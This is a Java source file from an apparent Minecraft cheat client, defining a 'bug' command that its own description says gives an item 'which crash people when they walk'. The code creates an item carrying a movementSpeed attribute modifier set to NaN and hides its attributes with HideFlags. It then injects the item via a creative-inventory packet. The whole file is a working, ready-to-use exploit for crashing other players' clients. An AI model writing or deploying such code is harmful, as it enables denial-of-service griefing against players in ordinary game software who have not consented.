package koks.command;

import koks.api.registry.command.Command;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

/**
 * @author kroko
 * @created on 31.01.2021 : 21:51
 */

@Command.Info(name = "bug", aliases = {"bugitem"}, description = "its give you a item which crash people when they walk")
public class Bug extends Command {
    @Override
    public boolean execute(String[] args) {
        if(args.length >= 1) {
            final int amount = args.length >= 2 && isInteger(args[1]) ? Integer.parseInt(args[1]) : 1;
            final byte meta = (byte) (args.length >= 3 && isInteger(args[2]) ? Integer.parseInt(args[2]) : 0);
            if(isInteger(args[0])) {
                final ItemStack itemStack = createItemStack(Integer.parseInt(args[0]), amount, meta);
                giveItem(generateBug(itemStack));
            } else {
                final ItemStack itemStack = createItemStack(args[0], amount, meta);
                giveItem(generateBug(itemStack));
            }
        } else {
            sendHelp(this, "[ID:Name] {Amount} {Meta}");
        }
        return true;
    }

    public ItemStack generateBug(ItemStack itemStack) {
        final NBTTagList attributeModifiers = new NBTTagList();
        final NBTTagCompound movementSpeed = new NBTTagCompound();
        final NBTTagCompound base = new NBTTagCompound();
        movementSpeed.setString("AttributeName", "generic.movementSpeed");
        movementSpeed.setString("Name", "generic.movementSpeed");
        movementSpeed.setDouble("Amount", Double.NaN);
        movementSpeed.setInteger("Operation", 0);
        movementSpeed.setInteger("UUIDMost", 67075);
        movementSpeed.setInteger("UUIDLeast", 805695);
        attributeModifiers.appendTag(movementSpeed);
        base.setTag("AttributeModifiers", attributeModifiers);
        base.setByte("HideFlags", (byte) 63);
        itemStack.setTagCompound(base);
        return itemStack;
    }
}
